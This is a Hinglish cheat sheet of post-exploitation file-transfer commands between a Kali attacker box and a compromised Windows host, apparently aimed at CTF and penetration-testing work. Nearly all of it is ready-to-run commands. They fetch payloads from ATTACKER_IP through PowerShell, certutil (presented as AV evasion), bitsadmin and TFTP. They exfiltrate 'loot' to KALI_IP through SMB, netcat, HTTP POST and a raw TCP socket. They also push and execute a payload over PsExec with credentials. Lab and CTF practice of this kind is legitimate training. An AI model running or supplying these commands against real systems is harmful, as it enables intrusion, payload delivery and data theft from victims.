🪟 ⇄ 🐉 Windows / Kali File Transfer Cheat Sheet

Reverse shell • CTF • Evil-WinRM • PsExec — sab methods ek jagah

Step 1 — Kali pe server start karo

HTTP server most common

python3 -m http.server 80

SMB server (Impacket)

impacket-smbserver share $(pwd) -smb2support

Step 2 — Windows shell se download

PowerShell — Invoke-WebRequest

powershell -c "Invoke-WebRequest -Uri http://ATTACKER_IP/file.exe -OutFile C:\Windows\Temp\file.exe"

PowerShell — Net.WebClient (legacy)

powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file.exe','C:\Windows\Temp\file.exe')"

certutil LOLBin / AV evasion

certutil -urlcache -split -f http://ATTACKER_IP/file.exe file.exe

bitsadmin

bitsadmin /transfer job /download /priority high http://ATTACKER_IP/file.exe C:\Windows\Temp\file.exe

curl.exe Win10+ built-in

curl.exe http://ATTACKER_IP/file.exe -o file.exe

SMB copy

copy \\ATTACKER_IP\share\file.exe C:\Windows\Temp\file.exe

TFTP

tftp -i ATTACKER_IP GET file.exe

Step 1 — Kali pe receiver taiyar karo

SMB server sabse aasan

impacket-smbserver share $(pwd) -smb2support -username test -password test

uploadserver (HTTP POST receive)

pip3 install uploadserver
python3 -m uploadserver 8000

Netcat listener

nc -lvnp 4444 > received_file.txt

Step 2 — Windows se bhejo (Kali ko)

SMB copy

net use \\KALI_IP\share /user:test test
copy C:\loot.txt \\KALI_IP\share\loot.txt

PowerShell upload (uploadserver ke sath)

powershell -c "Invoke-WebRequest -Uri http://KALI_IP:8000/upload -Method POST -InFile C:\loot.txt"

Netcat (agar nc.exe victim pe ho)

nc KALI_IP 4444 < C:\loot.txt

PowerShell raw TCP socket (nc na ho to)

$c=New-Object System.Net.Sockets.TCPClient("KALI_IP",4444)
$s=$c.GetStream()
$b=[IO.File]::ReadAllBytes("C:\loot.txt")
$s.Write($b,0,$b.Length); $s.Close(); $c.Close()

Base64 copy-paste jab sab firewall block ho

[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot.txt")) | Out-File b64.txt
type b64.txt
Kali pe decode: echo "BASE64" | base64 -d > loot.txt

Evil-WinRM built-in

Upload / Download

upload /local/path/file.exe C:\Windows\Temp\file.exe
download C:\Windows\Temp\loot.txt /local/path/loot.txt
Native feature — alag server ki zaroorat nahi.

PsExec / Impacket

Sysinternals PsExec (copy + run)

psexec.exe \\TARGET -u user -p pass -c payload.exe
-c flag local binary ko ADMIN$ share ke through copy karke run karta hai.

Impacket psexec.py

impacket-psexec user:pass@TARGET_IP

Impacket smbclient (file-only, no execution)

impacket-smbclient user:pass@TARGET_IP
> put file.exe
> get loot.txt
